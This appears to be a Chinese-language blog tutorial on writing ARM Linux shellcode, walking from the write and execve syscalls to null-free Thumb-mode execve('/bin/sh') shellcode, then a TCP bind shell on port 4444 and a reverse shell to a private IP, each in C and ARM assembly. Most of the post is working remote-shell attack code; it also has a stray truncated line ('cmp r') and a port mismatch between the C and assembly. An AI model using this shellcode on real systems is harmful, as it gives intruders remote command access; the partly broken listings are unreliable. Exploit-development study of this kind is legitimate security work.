---
title: ARM Shellcode
date: 2021-08-16
tags: ARM
---

## 系统调用

从write说起：

在linux中的原型为：

```c
size_t write(int fd, const void *buf, size_t count);
```

在c语言中的使用方法如下：

```c
const char string[13] = "Hello world\n";
write(1, string, sizeof(string));        // Here sizeof(string) is 13
```

把write的系统调用的汇编代码提取出来。如下：

```arm
   0x000270b0 <+0>: ldr r12, [pc, #96] ; 0x27118
   0x000270b4 <+4>: ldr r12, [pc, r12]
=> 0x000270b8 <+8>: teq r12, #0
   0x000270bc <+12>: push {r7}  ; (str r7, [sp, #-4]!)
   0x000270c0 <+16>: bne 0x270dc <write+44>
   0x000270c4 <+20>: mov r7, #4
   0x000270c8 <+24>: svc 0x00000000
```

fd, buf, count 分别保存在r0,r1,r2中，r7 存放着系统调用号，代表着write这个系统调用。

fd – 1 for STDOUT
buf – pointer to a string
count – number of bytes to write -> 13
syscall number of write -> 0x4

直接使用系统调用的方式：

```arm
mov   r0, #1      @ fd 1 = STDOUT
ldr   r1, string  @ loading the string from memory to R1
mov   r2, #13     @ write 13 bytes to STDOUT 
mov   r7, #4      @ Syscall 0x4 = write()
svc   #0
```

### 1.trace system call

使用下面的简单例程，然后把它转化成汇编代码：

```c
#include <stdio.h>

void main(void)
{
    system("/bin/sh");
}
```

```shell
strace -f -v <filename>

execve("/usr/bin/test", ["test"], [...]) = 0
```

### 2.system call number and parameters

```c
NAME
    execve - execute program
SYNOPSIS

    #include <unistd.h>

    int  execve(const char *filename, char *const argv [], char *const envp[]);
```

```arm
=> 0x000264d0 <+0>: push {r7, lr}
   0x000264d4 <+4>: mov r7, #11
   0x000264d8 <+8>: svc 0x00000000
   0x000264dc <+12>: cmn r0, #4096 ; 0x1000
   0x000264e0 <+16>: mov r3, r0
   0x000264e4 <+20>: bhi 0x264f0 <execve+32>
   0x000264e8 <+24>: mov r0, r3
   0x000264ec <+28>: pop {r7, pc}
   0x000264f0 <+32>: ldr r2, [pc, #20] ; 0x2650c <execve+60>
   0x000264f4 <+36>: rsb r1, r0, #0
   0x000264f8 <+40>: ldr r2, [pc, r2]
   0x000264fc <+44>: bl 0x11520 <__aeabi_read_tp>
   0x00026500 <+48>: mvn r3, #0
   0x00026504 <+52>: str r1, [r0, r2]
   0x00026508 <+56>: b 0x264e8 <execve+24>
   0x0002650c <+60>: andeq r0, r7, r0, asr #31
```

syscall为11

```arm
.section .text
.global _start

_start:
        add r0, pc, #12
        mov r1, #0
        mov r2, #0
        mov r7, #11
        svc #0

.ascii "/bin/sh\0"
```

```arm

execve:     file format elf32-littlearm


Disassembly of section .text:

00010054 <_start>:
   10054: e28f000c add r0, pc, #12
   10058: e3a01000 mov r1, #0
   1005c: e3a02000 mov r2, #0
   10060: e3a0700b mov r7, #11
   10064: ef000000 svc 0x00000000
   10068: 6e69622f .word 0x6e69622f
   1006c: 0068732f .word 0x0068732f

```

还是有很多NULL字符在里头的。

### 3. 去除NULL字符数据

我们可以用来减少空字节出现在shell代码中的一种技术是使用拇指模式。使用拇指模式可以减少空字节的机会，因为拇指指令长2字节，而不是4字节。

```arm
.section .text
.global _start

_start:
        .code 32
        add r3, pc, #1
        bx  r3

        .code 16
        add r0, pc, #8
        eor r1, r1, r1
        eor r2, r2, r2
        mov r7, #11
        svc #1
        mov r5, r5

.ascii "/bin/sh\0"
```

去空后，效果还是不错的。

```arm
   10054: e28f3001  add r3, pc, #1
   10058: e12fff13  bx r3
   1005c: a002       add r0, pc, #8 ; (adr r0, 10068 <_start+0x14>)
   1005e: 4049       eors r1, r1
   10060: 4052       eors r2, r2
   10062: 270b       movs r7, #11
   10064: df01       svc 1
   10066: 1c2d       adds r5, r5, #0
   10068: 6e69622f  .word 0x6e69622f
   1006c: 0068732f  .word 0x0068732f
```

提取shellcode：

```shell
objcopy -O binary execve3 execve3.bin 
```

## bind shell to tcp

过程：

创建新的TCP套接字
绑定socket到本地端口
等待传入的连接
接受传入的连接
将STDIN STDOUT STDERR从客户端重定向到新创建的套接字
生成shell

```c++
#include <stdio.h> 
#include <sys/types.h>  
#include <sys/socket.h> 
#include <netinet/in.h> 

int host_sockid;    // socket file descriptor 
int client_sockid;  // client file descriptor 

struct sockaddr_in hostaddr;            // server aka listen address

int main() 
{ 
    // Create new TCP socket 
    host_sockid = socket(PF_INET, SOCK_STREAM, 0); 

    // Initialize sockaddr struct to bind socket using it 
    hostaddr.sin_family = AF_INET;                  // server socket type address family = internet protocol address
    hostaddr.sin_port = htons(4444);                // server port, converted to network byte order
    hostaddr.sin_addr.s_addr = htonl(INADDR_ANY);   // listen to any address, converted to network byte order

    // Bind socket to IP/Port in sockaddr struct 
    bind(host_sockid, (struct sockaddr*) &hostaddr, sizeof(hostaddr)); 

    // Listen for incoming connections 
    listen(host_sockid, 2); 

    // Accept incoming connection 
    client_sockid = accept(host_sockid, NULL, NULL); 

    // Duplicate file descriptors for STDIN, STDOUT and STDERR 
    dup2(client_sockid, 0); 
    dup2(client_sockid, 1); 
    dup2(client_sockid, 2); 

    // Execute /bin/sh 
    execve("/bin/sh", NULL, NULL); 
    close(host_sockid); 

    return 0; 
}
```

Function|R7|R0|R1|R2
--|--|--|--|--
Socket|281|2|1|0
Bind|282|host_sockid|(struct sockaddr*) &hostaddr|16
Listen|284|host_sockid|2|–
Accept|285|host_sockid|0|0
Dup2|63|client_sockid|0 / 1 / 2|–
Execve|11|“/bin/sh”|0|0

```arm
.section .text
.global _start
    _start:
    .ARM
    add r3, pc, #1         // switch to thumb mode 
    bx r3

    .THUMB
// socket(2, 1, 0)
    mov r0, #2
    mov r1, #1
    sub r2, r2, r2      // set r2 to null
    mov r7, #200        // r7 = 281 (socket)
    add r7, #81         // r7 value needs to be split 
    svc #1              // r0 = host_sockid value
    mov r4, r0          // save host_sockid in r4

// bind(r0, &sockaddr, 16)
    adr  r1, struct_addr // pointer to address, port
    strb r2, [r1, #1]    // write 0 for AF_INET
    strb r2, [r1, #4]    // replace 1 with 0 in x.1.1.1
    strb r2, [r1, #5]    // replace 1 with 0 in 0.x.1.1
    strb r2, [r1, #6]    // replace 1 with 0 in 0.0.x.1
    strb r2, [r1, #7]    // replace 1 with 0 in 0.0.0.x
    mov r2, #16          // struct address length
    add r7, #1           // r7 = 282 (bind) 
    svc #1
    nop

// listen(sockfd, 0) 
    mov r0, r4           // set r0 to saved host_sockid
    mov r1, #2        
    add r7, #2           // r7 = 284 (listen syscall number) 
    svc #1        

// accept(sockfd, NULL, NULL); 
    mov r0, r4           // set r0 to saved host_sockid
    sub r1, r1, r1       // set r1 to null
    sub r2, r2, r2       // set r2 to null
    add r7, #1           // r7 = 284+1 = 285 (accept syscall)
    svc #1               // r0 = client_sockid value
    mov r4, r0           // save new client_sockid value to r4  

    cmp r
// dup2(sockfd, 0) 
    mov r7, #63         // r7 = 63 (dup2 syscall number) 
    mov r0, r4          // r4 is the saved client_sockid 
    sub r1, r1, r1      // r1 = 0 (stdin) 
    svc #1

// dup2(sockfd, 1)
    mov r0, r4          // r4 is the saved client_sockid 
    add r1, #1          // r1 = 1 (stdout) 
    svc #1

// dup2(sockfd, 2) 
    mov r0, r4          // r4 is the saved client_sockid
    add r1, #1          // r1 = 2 (stderr) 
    svc #1

// execve("/bin/sh", 0, 0) 
    adr r0, shellcode   // r0 = location of "/bin/shX"
    eor r1, r1, r1      // clear register r1. R1 = 0
    eor r2, r2, r2      // clear register r2. r2 = 0
    strb r2, [r0, #7]   // store null-byte for AF_INET
    mov r7, #11         // execve syscall number
    svc #1
    nop

struct_addr:
.ascii "\x02\xff" // AF_INET 0xff will be NULLed 
.ascii "\x11\x5c" // port number 4444 
.byte 1,1,1,1 // IP Address 
shellcode:
.ascii "/bin/shX"
```

### reverse shellcode

```c++
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
 
int main(void)
{
 int sockfd; // socket file descriptor
 socklen_t socklen; // socket-length for new connections
 
 struct sockaddr_in addr; // client address
 
 addr.sin_family = AF_INET; // server socket type address family = internet protocol address
 addr.sin_port = htons( 1337 ); // connect-back port, converted to network byte order
 addr.sin_addr.s_addr = inet_addr("127.0.0.1"); // connect-back ip , converted to network byte order
 
 // create new TCP socket
 sockfd = socket( AF_INET, SOCK_STREAM, IPPROTO_IP );
 
 // connect socket
 connect(sockfd, (struct sockaddr *)&addr, sizeof(addr));
 
 //  Duplicate file descriptors for STDIN, STDOUT and STDERR
 dup2(sockfd, 0);
 dup2(sockfd, 1);
 dup2(sockfd, 2);
 
 // spawn shell
 execve( "/bin/sh", NULL, NULL );
}
```

```arm
.section .text
.global _start
_start:
 .ARM
 add   r3, pc, #1       // switch to thumb mode 
 bx    r3

.THUMB
// socket(2, 1, 0) 
 mov   r0, #2
 mov   r1, #1
 sub   r2, r2
 mov   r7, #200
 add   r7, #81         // r7 = 281 (socket) 
 svc   #1              // r0 = resultant sockfd 
 mov   r4, r0          // save sockfd in r4 

// connect(r0, &sockaddr, 16) 
 adr   r1, struct        // pointer to address, port 
 strb  r2, [r1, #1]    // write 0 for AF_INET 
 mov   r2, #16
 add   r7, #2          // r7 = 283 (connect) 
 svc   #1

// dup2(sockfd, 0) 
 mov   r7, #63         // r7 = 63 (dup2) 
 mov   r0, r4          // r4 is the saved sockfd 
 sub   r1, r1          // r1 = 0 (stdin) 
 svc   #1
// dup2(sockfd, 1) 
 mov   r0, r4          // r4 is the saved sockfd 
 mov   r1, #1          // r1 = 1 (stdout) 
 svc   #1
// dup2(sockfd, 2) 
 mov   r0, r4         // r4 is the saved sockfd 
 mov   r1, #2         // r1 = 2 (stderr)
 svc   #1

// execve("/bin/sh", 0, 0) 
 adr   r0, binsh
 sub   r2, r2
 sub   r1, r1
 strb  r2, [r0, #7]
 mov   r7, #11       // r7 = 11 (execve) 
 svc   #1

struct:
.ascii "\x02\xff"      // AF_INET 0xff will be NULLed 
.ascii "\x11\x5c"      // port number 4444 
.byte 192,168,139,130  // IP Address 
binsh:
.ascii "/bin/shX"
```

